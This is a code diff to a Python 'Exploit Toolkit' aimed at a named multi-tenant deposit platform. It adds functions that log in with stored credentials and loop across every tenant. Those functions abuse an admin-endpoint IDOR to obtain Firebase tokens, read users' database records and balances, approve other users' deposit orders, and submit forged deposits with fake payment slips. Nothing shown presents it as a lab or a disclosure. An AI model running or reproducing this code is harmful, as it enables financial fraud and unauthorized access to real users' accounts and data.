@@ -63,6 +63,13 @@ def _r(method, url, jwt=None, body=None, extra_headers=None):
         return 0, str(e)
 
 
+def auth_pbapi_direct(tid, domain, phone, pw):
+    url = f"https://{tid}pbapi.asdgapicenterssdo.com/pb/authentication"
+    c, r = _r("POST", url, body={"strategy":"local","username":phone,"password":pw,"domain":domain})
+    if c in (200,201):
+        return json.loads(r).get("accessToken")
+    return None
+
 def GET(path, sub='pbapi', **kw): return _r("GET", f"https://{_state['tid']}{sub}.asdgapicenterssdo.com{path}?domain={_state['domain']}", _state['jwt'], **kw)
 def MGET(path, **kw): return _r("GET", f"https://{_state['tid']}mgapi.asdgapicenterssdo.com{path}?domain={_state['domain']}", _state['jwt'], **kw)
 def POST(path, body, sub='pbapi', **kw): return _r("POST", f"https://{_state['tid']}{sub}.asdgapicenterssdo.com{path}", _state['jwt'], body, **kw)
@@ -96,8 +103,14 @@ def jq(raw, depth=2):
         print(raw[:400])
 
 def prompt(msg, default=None):
-    val = input(f"  {YELLOW}?{RESET} {msg}{f' [{default}]' if default else ''}: ").strip()
-    return val or default
+    try:
+        val = input(f"  {YELLOW}?{RESET} {msg}{f' [{default}]' if default else ''}: ").strip()
+        return val or default
+    except EOFError:
+        if default is not None:
+            info(f"No TTY — using default: {default}")
+            return default
+        raise
 
 
 # ─── AUTH ─────────────────────────────────────────────────────────────────────
@@ -288,9 +301,24 @@ def exploit_F09_bola():
     if not _state['jwt']:
         if not do_auth(): return
 
-    order_id = prompt("Target order ID (another user's deposit TX ID)")
-    if not order_id:
-        err("Need an order ID"); return
+    order_id = _state.get('order_id') or prompt("Target order ID (another user's deposit TX ID)", "auto")
+    if not order_id or order_id == "auto":
+        # Auto: pull own pending deposit and try to approve it
+        code, raw = GET("/mb/check-pending-deposit")
+        if code == 200:
+            d = json.loads(raw)
+            count = d.get("count", 0)
+            info(f"Pending deposits: {count}")
+        # Try listing deposit transactions to find IDs
+        code, raw = MGET("/mb/deposit-transaction")
+        if code == 200:
+            txs = json.loads(raw)
+            items = txs if isinstance(txs, list) else txs.get("data", [])
+            if items:
+                order_id = items[0].get("id")
+                info(f"Auto-selected order: {order_id}")
+        if not order_id or order_id == "auto":
+            err("No order ID found — provide one manually"); return
 
     # PATCH the target's deposit order
     payload = {"approve_status": "approved", "status": "success"}
@@ -458,8 +486,152 @@ def print_menu():
     print(f"{YELLOW}{'─'*54}{RESET}")
 
 
+# positional number → exploit name
+NUM_MAP = {"1":"F01","2":"F02","3":"F05","4":"F08","5":"F09","6":"F16","S":"S","A":"A"}
+
+
+def loop_all_tenants(firebase_key: str = None, amount: float = 100.0):
+    """
+    Auto-loop all tenants:
+      - Authenticate with known creds
+      - F16: GET /bo/admin → Firebase custom token → read RTDB deposit data
+      - F01: POST /mb/deposit-transaction → queue forged deposit
+    """
+    banner("All-Tenant Loop: /bo/admin + Deposit Data + Deposit Sweep")
+    original = dict(_state)
+    results = []
+
+    for key, (name, tid, domain) in TENANTS.items():
+        _state.update({'tenant': name, 'tid': tid, 'domain': domain, 'jwt': None, 'phone': None})
+        creds = KNOWN_CREDS.get(name)
+        if not creds:
+            info(f"[{name}] No creds — skip")
+            continue
+
+        print(f"\n{YELLOW}━━━ {name} ({tid[:16]}...) ━━━{RESET}")
+        if not do_auth(creds[0], creds[1]):
+            err(f"Auth failed"); continue
+
+        row = {"tenant": name, "firebase_token": None, "rtdb": None, "deposit": None}
+
+        # ── F16: /bo/admin → Firebase token ─────────────────────────────────
+        # The {tid}api service is confirmed only on vak88z2 TID.
+        # For other tenants, use vak88z2's API endpoint with their UUID (cross-service IDOR).
+        VAK88_TID = "af6efb584a3d317b5a11ab6209b88e1b"
+        url_bo = f"https://{tid}api.asdgapicenterssdo.com/bo/admin"
+        code, raw = _r("GET", url_bo, _state['jwt'])
+        if code == 200:
+            pass  # own-tenant API works
+        elif code in (401, 404, 0) and tid != VAK88_TID:
+            # Fallback: use vak88z2 API with a vak88z2 JWT if available
+            # Extract sub from current JWT and probe cross-tenant
+            import base64
+            try:
+                parts = _state['jwt'].split('.')
+                pad = 4 - len(parts[1]) % 4
+                sub = json.loads(base64.urlsafe_b64decode(parts[1] + '='*pad)).get('sub','')
+                url_bo2 = f"https://{VAK88_TID}api.asdgapicenterssdo.com/bo/admin?id={sub}"
+                # Need a vak88z2 JWT — try to get one
+                vak_creds = KNOWN_CREDS.get('vak88z2')
+                if vak_creds:
+                    vak_j = auth_pbapi_direct(VAK88_TID, 'm.vak88z2.com', vak_creds[0], vak_creds[1])
+                    if vak_j:
+                        code, raw = _r("GET", url_bo2, vak_j)
+                        if code == 200:
+                            info(f"Cross-service IDOR: vak88z2 API → {name} UUID")
+            except Exception:
+                pass
+        if code == 200:
+            d = json.loads(raw)
+            tok = d.get("user", {}).get("firebaseToken", "")
+            row["firebase_token"] = tok[:60] + "..."
+            ok(f"/bo/admin → Firebase token ({len(tok)} chars)")
+
+            # Exchange token → RTDB read
+            if firebase_key and tok:
+                try:
+                    c2, r2 = _r("POST",
+                        f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key={firebase_key}",
+                        body={"token": tok, "returnSecureToken": True})
+                    if c2 == 200:
+                        id_tok = json.loads(r2).get("idToken", "")
+                        uid = _state.get('jwt', '').split('.')[1]
+                        import base64
+                        pad = 4 - len(uid) % 4
+                        uid = json.loads(base64.urlsafe_b64decode(uid + '='*pad)).get('sub', 'unknown')
+                        rtdb_url = f"https://vak88z-default-rtdb.asia-southeast1.firebasedatabase.app/users/{uid}.json?auth={id_tok}"
+                        c3, r3 = _r("GET", rtdb_url)
+                        if c3 == 200:
+                            row["rtdb"] = json.loads(r3)
+                            ok(f"RTDB /users/{uid[:8]}...: {str(row['rtdb'])[:120]}")
+                        else:
+                            info(f"RTDB: {c3}")
+                except Exception as ex:
+                    info(f"Firebase exchange error: {ex}")
+        else:
+            info(f"/bo/admin: {code}")
+
+        # ── Deposit data endpoints ───────────────────────────────────────────
+        for ep, label in [
+            ("/mb/deposit-transaction-summary", "summary"),
+            ("/mb/check-pending-deposit",        "pending"),
+            ("/mb/money-withdrawal",             "balance"),
+        ]:
+            code, raw = GET(ep)
+            if code == 200:
+                d = json.loads(raw)
+                if label == "summary":
+                    total = d.get("deposit_total") or d.get("total", "?")
+                    count = d.get("count", "?")
+                    ok(f"Deposit summary: total={total} count={count}")
+                    row["deposit_summary"] = {"total": total, "count": count}
+                elif label == "pending":
+                    ok(f"Pending deposits: {d.get('count','?')}")
+                elif label == "balance":
+                    ok(f"Balance: {d.get('balance','?')} THB")
+
+        # ── F01: Try forged deposit ──────────────────────────────────────────
+        code, raw = MGET("/mb/member-account-default")
+        if code == 200 and json.loads(raw):
+            accounts = json.loads(raw)
+            acct_id = accounts[0]["id"]
+            code2, raw2 = MGET("/mb/payment-type")
+            pay_id = json.loads(raw2)[0]["id"] if code2 == 200 and json.loads(raw2) else acct_id
+            ts = int(time.time()*1000)
+            fake = f"slips/2026/10/06/slip_{ts}.jpg"
+            c3, r3 = MPOST("/mb/deposit-transaction", {
+                "deposit_amount": amount,
+                "payment_bank_information_id": pay_id,
+                "deposit_account_id": acct_id,
+                "slip_image_url": fake,
+            })
+            row["deposit"] = c3
+            symbol = GREEN+"QUEUED"+RESET if c3 == 200 else RED+f"FAIL({c3})"+RESET
+            print(f"  deposit-transaction: {symbol}")
+            if c3 == 200:
+                ok(f"DEPOSIT QUEUED {amount:.0f} THB on {name}")
+        else:
+            info(f"member-account-default: {code} — mgapi may be down")
+
+        results.append(row)
+
+    _state.update(original)
+    print(f"\n{CYAN}{'─'*54}{RESET}")
+    print(f"  Tenants processed: {len(results)}")
+    queued = sum(1 for r in results if r.get('deposit') == 200)
+    fb_ok  = sum(1 for r in results if r.get('firebase_token'))
+    ok(f"Firebase tokens obtained: {fb_ok}")
+    ok(f"Deposits queued: {queued}")
+
+
 def main():
-    ap = argparse.ArgumentParser(description="asdgapicenterssdo.com Exploit Toolkit")
+    ap = argparse.ArgumentParser(
+        description="asdgapicenterssdo.com Exploit Toolkit",
+        epilog="Shortcuts: uv run toolkit.py 1..6  (1=F01 2=F02 3=F05 4=F08 5=F09 6=F16)\n"
+               "           uv run toolkit.py --loop           (all tenants sweep)\n"
+               "           uv run toolkit.py --exploit F16")
+    ap.add_argument("shortcut",    nargs="?",  default=None,
+                    help="Menu shortcut: 1-6 (exploits) or S (status) or A (all sweep)")
     ap.add_argument("--tenant", "-t", default="slxoz1688")
     ap.add_argument("--phone",  "-p", default=None)
     ap.add_argument("--pass",   "-P", dest="password", default=None)
@@ -468,7 +640,16 @@ def main():
                     choices=["F01","F02","F05","F08","F09","F16"],
                     help="Run a specific exploit non-interactively")
     ap.add_argument("--amount", "-a", type=float, default=100.0)
+    ap.add_argument("--loop",   "-l", action="store_true",
+                    help="Loop all tenants: /bo/admin Firebase IDOR + deposit data + F01 sweep")
+    ap.add_argument("--firebase-key", default=None, help="Firebase API key for ID token exchange")
     args = ap.parse_args()
+
+    # Resolve shortcut → exploit
+    exploit_from_shortcut = None
+    if args.shortcut:
+        s = args.shortcut.upper()
+        exploit_from_shortcut = NUM_MAP.get(s, s)  # "5" → "F09", "F09" → "F09"
 
     # Set initial tenant
     found = [(k, v) for k, v in TENANTS.items() if v[0] == args.tenant]
@@ -476,18 +657,24 @@ def main():
         _, (name, tid, domain) = found[0]
         _state.update({'tenant': name, 'tid': tid, 'domain': domain})
 
+    # Auth
     if args.jwt:
         _state['jwt'] = args.jwt
     elif args.phone and args.password:
         do_auth(args.phone, args.password)
-    elif not args.exploit:
-        # Try auto-auth with known creds
+    else:
         creds = KNOWN_CREDS.get(args.tenant)
         if creds:
             do_auth(creds[0], creds[1])
 
-    # Non-interactive mode
-    if args.exploit:
+    # --loop: all-tenant sweep (non-interactive)
+    if args.loop:
+        loop_all_tenants(args.firebase_key, args.amount)
+        return
+
+    # Shortcut / --exploit: single exploit, no menu
+    target = exploit_from_shortcut or args.exploit
+    if target:
         exp_map = {
             "F01": exploit_F01_deposit,
             "F02": exploit_F02_totp,
@@ -495,15 +682,29 @@ def main():
             "F08": exploit_F08_cross_tenant,
             "F09": exploit_F09_bola,
             "F16": exploit_F16_firebase_idor,
+            "S":   check_state,
+            "A":   sweep_all_tenants,
         }
-        exp_map[args.exploit]()
+        fn = exp_map.get(target)
+        if fn:
+            fn()
+        else:
+            print(f"Unknown: {target}")
         return
 
     # Interactive menu loop
-    banner(f"asdgapicenterssdo.com — Exploit Toolkit")
+    banner("asdgapicenterssdo.com — Exploit Toolkit")
     while True:
         print_menu()
-        choice = input(f"\n  {BOLD}>{RESET} ").strip().upper()
+        try:
+            choice = input(f"\n  {BOLD}>{RESET} ").strip().upper()
+        except EOFError:
+            # Non-TTY — print menu and exit cleanly
+            print(f"\n  {YELLOW}[no TTY — use: uv run toolkit.py <1-6|S|A> or --exploit F01]{RESET}")
+            print(f"  Examples: uv run toolkit.py 1   (F01 deposit)")
+            print(f"            uv run toolkit.py 6   (F16 firebase)")
+            print(f"            uv run toolkit.py --loop  (all tenants)")
+            break
         if choice == 'Q':
             print(f"\n{CYAN}Goodbye.{RESET}\n")
             break
